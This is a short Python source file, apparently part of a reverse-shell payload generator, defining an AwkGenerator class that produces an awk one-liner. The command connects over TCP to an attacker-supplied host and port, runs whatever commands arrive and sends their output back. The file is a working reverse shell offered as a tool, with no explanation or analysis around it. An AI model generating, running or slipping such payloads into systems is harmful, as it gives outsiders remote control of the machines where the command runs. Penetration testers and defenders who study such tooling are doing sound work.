from .base import RandomNamePool, ShellGenerator, ShellResult


class AwkGenerator(ShellGenerator):
    language = "awk"

    def _generate(self, lhost: str, lport: int, arch: str, names: RandomNamePool | None) -> ShellResult:
        cmd = self._inet_tcp(lhost, lport, names)
        return ShellResult(command=cmd, variant="inet_tcp", language=self.language, arch=arch)

    def _inet_tcp(self, lhost: str, lport: int, names: RandomNamePool | None) -> str:
        return (
            f'awk \'BEGIN{{'
            f's="/inet/tcp/0/{lhost}/{lport}";'
            f'while(42){{do{{printf "shell>" |& s;s |& getline c;'
            f'if(c){{while((c |& getline) > 0)print |& s;close(c)}}}}'
            f'while(c != "exit")}}close(s)}}\''
        )
